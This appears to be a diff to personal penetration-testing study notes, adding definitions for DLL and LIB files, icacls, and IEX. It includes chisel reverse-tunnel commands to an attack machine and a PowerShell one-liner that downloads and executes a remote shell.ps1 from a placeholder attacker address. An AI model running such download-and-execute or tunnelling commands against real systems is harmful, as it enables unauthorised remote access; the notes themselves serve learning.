@@ -169,6 +169,10 @@ Chisel - tunnieling tool chisel client 10.10.14.3:8000 R:80:127.0.0.1:80 	Listen
 chisel client 10.10.14.3:8000 R:4444:10.10.10.240:80 	Listen on attack on 4444, forward to 10.10.10.240 port 80
 chisel client 10.10.14.3:8000 R:socks 
 
-.dll - dinamic link library - contains compiled functions, drivers, or other data that multiple Windows programs can use. Many Windows programs use DLL files to perform common functions. Multiple programs can even use the same DLL files at the same time. May ve vehicles for malware given that the program that uses the DLL might runas admin. They are like exes, but not directly executable. It is called during runtime. https://fileinfo.com/extension/dll https://stackoverflow.com/questions/124549/what-exactly-are-dll-files-and-how-do-they-work
+.dll - dinamic link library - contains compiled functions, drivers, or other data that multiple Windows programs can use. Many Windows programs use DLL files to perform common functions. Multiple programs can even use the same DLL files at the same time. May ve vehicles for malware given that the program that uses the DLL might runas admin. They are like exes, but not directly executable. It is called during runtime. To check how it was compiled use "file". https://fileinfo.com/extension/dll https://stackoverflow.com/questions/124549/what-exactly-are-dll-files-and-how-do-they-work
 
-.lib - Generic data library - this is a more common library such as the ones used by python but they are static they don't change once compiled. .lib are called called during compilation
+.lib - Generic data library - this is a more common library such as the ones used by python but they are static they don't change once compiled. .lib are called called during compilation - https://fileinfo.com/extension/lib
+
+icacls - Windows command-line utility used to view, modify, back up, and restore file and directory permissions through Windows Access Control Lists (ACLs). https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls
+
+iex - this command takes a file and execute it in windows - IEX (New-Object Net.WebClient).DownloadString('http://<your-ip>:<you-port>/shell.ps1')
